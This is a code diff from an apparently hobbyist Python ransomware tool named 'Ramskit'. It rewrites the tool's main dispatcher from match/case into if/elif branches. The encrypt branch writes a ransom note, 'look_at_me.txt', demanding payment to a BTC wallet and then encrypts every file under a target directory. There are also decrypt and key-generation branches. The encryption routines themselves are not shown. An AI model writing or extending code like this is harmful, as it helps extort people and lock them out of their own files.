@@ -103,24 +103,23 @@ if __name__ == '__main__':
     items: [str] = list(Ramskit.flatten(Ramskit.expand_dir(path)))
     lam = os.path.join(path, 'look_at_me.txt')
 
-    match action:
-        case 'encrypt':
-            with open(lam, 'w') as f:
-                f.write('''
-                    Heyo, this file has been encrypted!.
-                    You need to email me so I can give u my BTC wallet for the
-                    decrypt's purchase lololololol \n\n
-                ''')
-            ramskit.encrypt_file(items)
-        case 'decrypt':
-            if not os.path.exists(lam):
-                print('No look_at_me.txt file found. Exiting...')
-                sys.exit(1)
-            os.remove(lam)
-            items.remove(lam)
-            ramskit.decrypt_file(items)
-        case 'generate_key':
-            print(Ramskit.generate_key())
-        case _:
-            raise Exception('Invalid action: ', action)
+    if action == 'encrypt':
+        with open(lam, 'w') as f:
+            f.write('''
+                Heyo, this file has been encrypted!.
+                You need to email me so I can give u my BTC wallet for the
+                decrypt's purchase lololololol \n\n
+            ''')
+        ramskit.encrypt_file(items)
+    elif action == 'decrypt':
+        if not os.path.exists(lam):
+            print('No look_at_me.txt file found. Exiting...')
             sys.exit(1)
+        os.remove(lam)
+        items.remove(lam)
+        ramskit.decrypt_file(items)
+    elif action == 'generate_key':
+        print(Ramskit.generate_key())
+    else:
+        raise Exception('Invalid action: ', action)
+        sys.exit(1)
